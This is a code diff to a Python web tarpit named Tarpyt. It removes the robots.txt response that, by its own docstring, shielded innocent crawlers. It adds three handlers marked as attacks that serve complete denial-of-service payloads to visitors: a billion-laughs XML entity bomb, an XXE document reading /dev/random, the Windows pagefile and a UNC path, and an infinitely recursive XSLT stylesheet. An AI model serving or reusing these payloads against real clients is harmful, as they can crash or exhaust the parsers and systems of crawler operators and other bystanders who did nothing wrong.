@@ -51,6 +51,8 @@ class Tarpyt(object):
 
     def getresponse(self, key):
         index = adler32(key) % self.weight_total
+        i = bisect_right(self.weights, index)
+        r = self.responses[i]
         return self.responses[bisect_right(self.weights, index)]
 
     def getlink(self, path='/'):
@@ -169,15 +171,71 @@ class Tarpyt(object):
         start_response(status, headers)
         return ["",""] #Prevent WSGI from calculating content-length
 
-    def response_robots(self, environ, start_response):
-        """ Category: safety
-        Sends a robots.txt which disallows all paths for all robots. This
-        should guarantee no innocent spiders get caught in our tarpit.
+    def response_entity_dos(self, environ, start_response):
+        """ Category: attack
+        Sends a malicious XML document that triggers a denial of service through
+        entity expansions.
+        
+        Reference: CWE-776 (http://cwe.mitre.org/data/definitions/776.html)
         """
-        robots = "User-agent: *\nDisallow: /\n"
         status = '200 OK'
-        start_response(status, [])
-        return [robots]
+        headers = [('Content-type', 'application/xml')]
+        start_response(status, headers)
+        return """<?xml version="1.0"?>
+        <!DOCTYPE spaml [
+        <!ENTITY a "spam">
+        <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+        <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+        <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+        <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
+        <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
+        <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
+        <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
+        <!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
+        <!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;">
+        <!ENTITY spam "&j;&j;&j;&j;&j;&j;&j;&j;&j;&j;">
+        ]>
+        <spaml>&spam;<spaml>
+        """
+
+    def response_xxe_dos(self, environ, start_response):
+        """ Category: attack
+        Sends a malicious XML document that triggers a denial of service through
+        Xml eXternal Entity references. Works best against *nix by reading from
+        devices that never close. On Windows, currently tries to read
+        pagefile.sys and access a probably-nonexistent server via UNC path. See
+        http://archive.cert.uni-stuttgart.de/bugtraq/2002/10/msg00421.html
+        """
+        status = '200 OK'
+        headers = [('Content-type', 'application/xml')]
+        start_response(status, headers)
+        return """<?xml version="1.0"?>
+        <!DOCTYPE xxe [
+        <!ENTITY r SYSTEM "file:///dev/random">
+        <!ENTITY p SYSTEM "file://C:/pagefile.sys">
+        <!ENTITY u SYSTEM "file:////foo/C$/pagefile.sys">
+        ]>
+        <xxe>&r;&p;&u;</xxe>
+        """
+
+    def response_xslt_recurse(self, environ, start_response):
+        """ Category: attack
+        Sends an XSL stylesheet containing an infinite recursion. The
+        stylesheet, itself XML, references itself as its own stylesheet to begin
+        the transform process, and the root template calls itself.
+        """
+        status = '200 OK'
+        headers = [('Content-type', 'application/xml')]
+        start_response(status, headers)
+        return """<?xml version="1.0"?>
+        <?xml-stylesheet type="text/xsl" href="{0}"?>
+        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+            <xsl:template match="/">
+                <blink>SPAM</blink>
+                <xsl:apply-templates select="/" />
+            </xsl:template>
+        </xsl:stylesheet>
+        """.format(os.path.normpath(environ['SCRIPT_NAME']+'/'+environ['PATH_INFO']))
 
     def application(self, environ, start_response):
         verb = environ['REQUEST_METHOD']
